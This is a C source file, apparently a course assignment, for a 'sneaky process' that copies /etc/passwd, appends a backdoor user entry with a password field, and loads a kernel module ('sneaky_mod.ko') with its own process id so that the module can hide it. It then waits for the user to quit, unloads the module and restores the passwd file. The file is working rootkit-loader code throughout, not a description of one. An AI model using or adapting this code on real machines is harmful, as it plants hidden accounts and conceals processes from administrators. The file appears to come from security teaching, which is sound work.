/**
 * Author: Prathikshaa Rangarajan
 * Date: March 20, 2019
 * File Name: sneaky_processs.c
 * Description:
 * Loads sneaky_mod.ko
 * Waits for user to enter q.
 * Unloads sneaky_mod
 */

#include <error.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void run_command(const char *command, char *const args[]) {
  pid_t pid_fork, wait_res;
  int wstatus;

  pid_fork = fork();
  if (pid_fork == -1) {
    // fork error
    perror("fork error");
  } else if (pid_fork == 0) {
    // child
    execv(command, args); // does not return on success
    perror("execv");
    // printf("%s", args);
  } else {
    // parent
    wait_res = waitpid(pid_fork, &wstatus, 0);
    if (wait_res == -1) {
      // error waiting for child
      perror("waitpid");
    }
    return;
  }
}

void modify_passwd_file() {
  // copy /etc/passwd to /tmp/passwd
  /* char *const command[] = {"/bin/ls", "-l", 0}; // needs to be null
   * terminated */
  /* run_command(command[0], command); */

  char *const cp_passwd_file[] = {"/bin/cp", "/etc/passwd", "/tmp/passwd", 0};
  run_command(cp_passwd_file[0], cp_passwd_file);
  printf("Copied /etc/passwd to /tmp/passwd");

  // add following line to end of tmp/passwd
  // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
  FILE *fp;

  fp = fopen("/etc/passwd", "a");
  if (fp == NULL) {
    perror("fopen passwd file");
    exit(EXIT_FAILURE);
  }

  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp);

  printf("\nappended sneaky line to /etc/passwd\n\n");
}

void reset_passwd_file() {
  /* char *const test_open[] = {"/bin/cat", "/etc/passwd", */
  /*                            0}; // needs to be null terminated */
  /* run_command(test_open[0], test_open); */

  // cp /tmp/passwd to /etc/psswd
  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd",
                                     0};
  run_command(reset_passwd_file[0], reset_passwd_file);
  /* printf("\nafter resetting /etc/passwd\n\n"); */
  /* run_command(test_open[0], test_open); */
}

int main(void) {
  /*-------------------------------1------------------------------*/
  int pid = getpid();
  printf("sneaky_process pid = %d\n", pid);
  /*-------------------------------2------------------------------*/
  modify_passwd_file();

  /*-------------------------------3------------------------------*/
  // load sneaky module using insmod()
  // pass pid to module
  // ref: http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html

  char kern_param_pid[20];
  memset(kern_param_pid, 0, 20);
  snprintf(kern_param_pid, 20, "sneaky_pid=%d", pid);
  printf("kern_param:\n%s\n", kern_param_pid);
  char *const load_module_cmd[] = {"/sbin/insmod", "sneaky_mod.ko",
                                   kern_param_pid, 0};
  run_command(load_module_cmd[0], load_module_cmd);

  /*-------------------------------4------------------------------*/
  // while(1)
  // take keyboard input until "q"-quit
  // execute the commands from user -- to test sneaky_mod

  char *curr = NULL;
  size_t len; // = BUF_SIZE;
  ssize_t read_len;

  /* printf("Enter commands to evaluate. Enter q to exit.\n"); */
  /* const char *quit = "q"; */
  /* int res = 0; */
  /* while ((read_len = getline(&curr, &len, stdin)) != -1) { */
  /*   char *newline_ptr = strchr(curr, '\n'); */
  /*   if (newline_ptr != NULL) { */
  /*     *newline_ptr = '\0'; */
  /*   } */
  /*   //    printf("read line %s\n", curr); */
  /*   if ((res = strcmp(curr, quit)) == 0) { */
  /*     printf("quit"); */
  /*     break; */
  /*   } */
  /*   //    printf("%d\n", res); */
  /*   printf("Enter commands to evaluate. Enter q to exit.\n"); */
  /* } */

  // test malicious behavior
  printf("Enter q to quit and unload sneaky_mod\n");
  while ((read_len = getline(&curr, &len, stdin)) != -1) {
    char *is_q = strchr(curr, 'q');
    if (is_q != NULL) {
      printf("Quitting\n");
      break;
    }
    printf("Enter q to quit and unload sneaky_mod\n");
  }

  // end while
  /*-------------------------------5------------------------------*/
  // unload sneaky kernel module using rmmod()
  char *const unload_module_cmd[] = {"/sbin/rmmod", "sneaky_mod", 0};
  run_command(unload_module_cmd[0], unload_module_cmd);
  printf("Removing sneaky_kernel module\n");

  /*-------------------------------6------------------------------*/
  printf("Resetting password file.\n");
  reset_passwd_file();

  return EXIT_SUCCESS;
}
